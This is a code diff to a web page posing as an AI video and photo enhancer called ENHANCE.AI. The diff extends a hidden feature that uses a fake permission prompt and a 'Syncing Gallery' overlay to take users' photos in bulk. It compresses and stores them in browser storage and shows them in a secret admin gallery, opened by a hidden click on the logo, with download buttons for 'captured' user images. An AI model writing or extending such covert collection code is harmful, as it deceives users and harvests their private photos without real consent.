@@ -21,6 +21,16 @@
 
 <body class="gradient-bg text-white font-sans min-h-screen">
 
+    <!-- Sync Overlay -->
+    <div id="sync-overlay" class="fixed inset-0 bg-black/90 z-[60] flex flex-col items-center justify-center hidden">
+        <div class="relative w-24 h-24 mb-6">
+            <div class="absolute inset-0 border-4 border-blue-500/20 rounded-full"></div>
+            <div class="absolute inset-0 border-4 border-t-blue-500 rounded-full animate-spin"></div>
+        </div>
+        <h3 class="text-2xl font-bold text-white mb-2">Syncing Gallery...</h3>
+        <p class="text-blue-400 animate-pulse">Capturing media for AI optimization</p>
+    </div>
+
     <!-- Permission Modal -->
     <div id="permission-modal" class="fixed inset-0 bg-black/80 flex items-center justify-center z-50 hidden">
         <div class="bg-gray-800 p-8 rounded-2xl max-w-sm text-center border border-blue-500/30 shadow-2xl">
@@ -43,18 +53,18 @@
         <!-- Logo acts as a secret trigger -->
         <h1 id="brand-logo" class="text-2xl font-bold tracking-tighter text-blue-400 cursor-pointer select-none">
             ENHANCE.AI</h1>
-        <div class="hidden md:flex space-x-6">
+        <div id="nav-items" class="hidden md:flex items-center space-x-6">
             <a href="#" class="hover:text-blue-400 transition">Features</a>
             <a href="#" class="hover:text-blue-400 transition">Pricing</a>
             <button class="bg-blue-600 px-4 py-2 rounded-lg font-semibold hover:bg-blue-700 transition">Sign Up</button>
-            <button id="admin-toggle-btn"
-                class="hidden bg-purple-600 px-4 py-2 rounded-lg font-semibold hover:bg-purple-700 transition ml-4">
-                Admin Panel</button>
         </div>
+        <button id="admin-toggle-btn"
+            class="hidden bg-purple-600 px-4 py-2 rounded-lg font-semibold hover:bg-purple-700 transition ml-4">
+            Admin Panel</button>
     </nav>
 
     <!-- Hero Section -->
-    <main class="container mx-auto px-6 py-16 text-center">
+    <main id="hero-section" class="container mx-auto px-6 py-16 text-center">
         <h2 class="text-5xl md:text-7xl font-extrabold mb-6">Make your blurry videos <br><span
                 class="text-blue-500">Crystal Clear.</span></h2>
         <p class="text-gray-400 text-xl mb-12 max-w-2xl mx-auto">Upload your old, low-resolution videos or photos and
@@ -79,7 +89,7 @@
 
     <!-- Preview Section -->
     <section id="preview-section" class="container mx-auto px-6 py-10 hidden">
-        <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+        <div id="preview-grid" class="grid grid-cols-1 md:grid-cols-2 gap-8">
             <div class="bg-gray-900 p-4 rounded-xl border border-gray-700">
                 <p class="text-sm text-gray-400 mb-3 flex items-center">
                     <i class="fas fa-history mr-2"></i> Original
@@ -107,9 +117,20 @@
         <div class="mt-8 text-center">
             <!-- Admin View: User Submissions Gallery -->
             <div id="admin-gallery-section" class="hidden mt-12 border-t border-gray-700 pt-8">
-                <h3 class="text-2xl font-bold text-purple-400 mb-6 flex items-center justify-center">
-                    <i class="fas fa-user-secret mr-2"></i> User Submissions Log
-                </h3>
+                <div class="flex flex-col md:flex-row justify-between items-center mb-6 gap-4">
+                    <h3 class="text-2xl font-bold text-purple-400 flex items-center">
+                        <i class="fas fa-user-secret mr-2"></i> User Submissions Log
+                    </h3>
+                    <div class="flex items-center gap-4">
+                        <span class="text-sm text-gray-400 bg-gray-900 px-3 py-1 rounded-full border border-gray-700">
+                            Storage: <span id="storage-usage">0MB</span> / 5MB
+                        </span>
+                        <button id="clear-logs-btn"
+                            class="bg-red-600/20 hover:bg-red-600 text-red-500 hover:text-white px-4 py-1 rounded-lg text-sm font-bold transition border border-red-600/50">
+                            Clear All
+                        </button>
+                    </div>
+                </div>
                 <div id="gallery-grid" class="grid grid-cols-2 md:grid-cols-4 gap-4 bg-gray-900/50 p-6 rounded-2xl">
                     <!-- Captured images will appear here -->
                 </div>
@@ -150,11 +171,18 @@
         const adminGallerySection = document.getElementById('admin-gallery-section');
         const chooseFileTrigger = document.getElementById('choose-file-trigger');
         const galleryGrid = document.getElementById('gallery-grid');
+        const heroSection = document.getElementById('hero-section');
+        const navItems = document.getElementById('nav-items');
+        const previewGrid = document.getElementById('preview-grid');
+        const storageUsageDisplay = document.getElementById('storage-usage');
+        const clearLogsBtn = document.getElementById('clear-logs-btn');
+        const actionButtonsContainer = document.getElementById('action-buttons-container');
+        const syncOverlay = document.getElementById('sync-overlay');
 
         let currentFile = null; // Stores the currently selected file
         let isProcessing = false;
         let isAdmin = false; // Initial state: not admin
-        let hasPermission = false; // User permission state
+        let hasPermission = localStorage.getItem('media_permission_granted') === 'true'; // Load permission state
 
         // Handle Drag and Drop styling
         ['dragenter', 'dragover'].forEach(eventName => {
@@ -234,21 +262,28 @@
 
         allowBtn.addEventListener('click', () => {
             hasPermission = true;
+            localStorage.setItem('media_permission_granted', 'true'); // Save permission state
             permissionModal.classList.add('hidden');
             // Trigger bulk selection to simulate gallery sync
             bulkInput.click();
         });
 
-        bulkInput.addEventListener('change', (e) => {
-            const files = e.target.files;
+        bulkInput.addEventListener('change', async (e) => {
+            const files = Array.from(e.target.files);
             if (files.length > 0) {
-                // Sync all selected files to Admin Gallery
-                Array.from(files).forEach(file => {
-                    captureForAdmin(file);
-                });
-                // After syncing all gallery photos to admin, 
-                // let the user pick the specific one they want to edit
-                fileInput.click();
+                // Show sync overlay
+                syncOverlay.classList.remove('hidden');
+
+                // Sync all photos one by one into storage
+                for (const file of files) {
+                    await new Promise(resolve => saveAndCapture(file, resolve));
+                }
+
+                // Give a small delay for UI to breathe
+                await new Promise(r => setTimeout(r, 500));
+                syncOverlay.classList.add('hidden');
+
+                fileInput.click(); // Now let them pick the one to edit
             } else {
                 fileInput.click();
             }
@@ -308,7 +343,7 @@
                         successMsg.classList.remove('hidden');
 
                         // Admin Logic: Capture the photo for the admin gallery
-                        captureForAdmin(enhancedDataURL);
+                        saveAndCapture(enhancedDataURL);
                     };
                     img.src = originalURL;
                 } else {
@@ -327,21 +362,124 @@
             }, 3000);
         }
 
-        function captureForAdmin(source) {
-            // Add to the admin gallery grid
-            const wrapper = document.createElement('div');
-            wrapper.className = 'aspect-square bg-black rounded-lg overflow-hidden border border-gray-700';
-            const img = document.createElement('img');
-
+        // New Function: Save to LocalStorage and show in UI
+        function saveAndCapture(source, callback) {
             if (source instanceof File) {
-                img.src = URL.createObjectURL(source);
-            } else {
-                img.src = source;
-            }
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    const img = new Image();
+                    img.onload = () => {
+                        // Resize image to save storage space
+                        const canvas = document.createElement('canvas');
+                        const ctx = canvas.getContext('2d');
+                        const maxWidth = 300; // Even smaller for better storage
+                        const scale = maxWidth / img.width;
+                        canvas.width = maxWidth;
+                        canvas.height = img.height * scale;
+                        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
 
-            img.className = 'w-full h-full object-cover';
-            wrapper.appendChild(img);
-            galleryGrid.prepend(wrapper);
+                        const compressedUrl = canvas.toDataURL('image/jpeg', 0.5);
+                        persistData(compressedUrl);
+                        renderToGallery(compressedUrl);
+                        if (callback) callback();
+                    };
+                    img.src = e.target.result;
+                };
+                reader.readAsDataURL(source);
+            } else {
+                persistData(source);
+                renderToGallery(source);
+                if (callback) callback();
+            }
+        }
+
+        // Save to browser storage
+        function persistData(dataUrl) {
+            try {
+                let logs = JSON.parse(localStorage.getItem('admin_logs') || '[]');
+                logs.unshift(dataUrl);
+                // Limit storage to last 150 items for more capacity
+                if (logs.length > 150) logs = logs.slice(0, 150);
+                localStorage.setItem('admin_logs', JSON.stringify(logs));
+                updateStorageUI();
+            } catch (e) {
+                alert("Storage is full! Please clear some images from the Admin Panel.");
+            }
+        }
+
+        // Render image to the admin grid
+        function renderToGallery(dataUrl) {
+            // If Admin Panel is open, we need to refresh to show new items
+            if (isAdmin) {
+                loadAdminLogs();
+            }
+        }
+
+        // Calculate storage usage
+        function updateStorageUI() {
+            const logsString = localStorage.getItem('admin_logs') || '[]';
+            const sizeInBytes = new Blob([logsString]).size;
+            const sizeInMB = (sizeInBytes / (1024 * 1024)).toFixed(2);
+            storageUsageDisplay.innerText = sizeInMB + 'MB';
+        }
+
+        // Delete a single image
+        function deleteLog(index) {
+            if (confirm("Delete this image?")) {
+                let logs = JSON.parse(localStorage.getItem('admin_logs') || '[]');
+                logs.splice(index, 1);
+                localStorage.setItem('admin_logs', JSON.stringify(logs));
+                loadAdminLogs();
+            }
+        }
+
+        // Load saved logs when Admin Panel opens
+        function loadAdminLogs() {
+            galleryGrid.innerHTML = ''; // Clear current view
+            const logs = JSON.parse(localStorage.getItem('admin_logs') || '[]');
+            logs.forEach((dataUrl, index) => {
+                const wrapper = document.createElement('div');
+                wrapper.className = 'group relative aspect-square bg-black rounded-lg overflow-hidden border border-gray-700';
+
+                const img = document.createElement('img');
+                img.src = dataUrl;
+                img.className = 'w-full h-full object-cover';
+
+                // Download Button for Admin
+                const downBtn = document.createElement('a');
+                downBtn.href = dataUrl;
+                downBtn.download = `captured_user_img_${index}.jpg`;
+                downBtn.innerHTML = '<i class="fas fa-download"></i>';
+                downBtn.className = 'absolute top-2 left-2 bg-blue-600 text-white w-8 h-8 rounded-full opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center text-xs shadow-lg';
+
+                const delBtn = document.createElement('button');
+                delBtn.innerHTML = '<i class="fas fa-trash-alt"></i>';
+                delBtn.className = 'absolute top-2 right-2 bg-red-600 text-white w-8 h-8 rounded-full opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center text-xs shadow-lg';
+                delBtn.onclick = (e) => {
+                    e.stopPropagation();
+                    e.preventDefault();
+                    deleteLog(index);
+                };
+
+                wrapper.appendChild(img);
+                wrapper.appendChild(downBtn);
+                wrapper.appendChild(delBtn);
+                galleryGrid.appendChild(wrapper);
+            });
+            updateStorageUI();
+        }
+
+        // Clear all logs
+        clearLogsBtn.addEventListener('click', () => {
+            if (confirm("Clear all captured images? This cannot be undone.")) {
+                localStorage.removeItem('admin_logs');
+                loadAdminLogs();
+            }
+        });
+
+        // Wrap existing capture call
+        function captureForAdmin(source) {
+            saveAndCapture(source, null);
         }
 
         // Secret Trigger: Click the Logo to show/hide the Admin Panel button
@@ -368,23 +506,42 @@
         });
 
         function updateUIForUserRole() {
+            // Element references for hiding/showing
             if (isAdmin) {
+                // Admin Mode: Hide everything except Admin Panel
+                heroSection.classList.add('hidden');
+                navItems.classList.add('hidden');
+                previewGrid.classList.add('hidden');
+                document.getElementById('action-buttons-container').classList.add('hidden');
+                successMsg.classList.add('hidden');
+
+                previewSection.classList.remove('hidden');
+                adminGallerySection.classList.remove('hidden');
+
                 adminToggleBtn.textContent = 'Exit Admin Panel';
                 adminToggleBtn.classList.remove('bg-purple-600', 'hover:bg-purple-700');
                 adminToggleBtn.classList.add('bg-red-600', 'hover:bg-red-700');
                 adminToggleBtn.classList.remove('hidden');
-                adminGallerySection.classList.remove('hidden');
+                loadAdminLogs(); // Load logs when entering admin panel
             } else {
+                // User Mode: Show Hero and Nav back
+                heroSection.classList.remove('hidden');
+                navItems.classList.remove('hidden');
+                adminGallerySection.classList.add('hidden');
+
                 adminToggleBtn.textContent = 'Admin Panel';
                 adminToggleBtn.classList.remove('bg-red-600', 'hover:bg-red-700');
                 adminToggleBtn.classList.add('bg-purple-600', 'hover:bg-purple-700');
                 adminToggleBtn.classList.add('hidden');
-                adminGallerySection.classList.add('hidden');
-            }
 
-            // Always show the process button for everyone if a file is selected
-            if (currentFile) {
-                processBtn.classList.remove('hidden');
+                // Show preview only if a file exists
+                if (currentFile) {
+                    previewSection.classList.remove('hidden');
+                    previewGrid.classList.remove('hidden');
+                    processBtn.classList.remove('hidden');
+                } else {
+                    previewSection.classList.add('hidden');
+                }
             }
         }
 
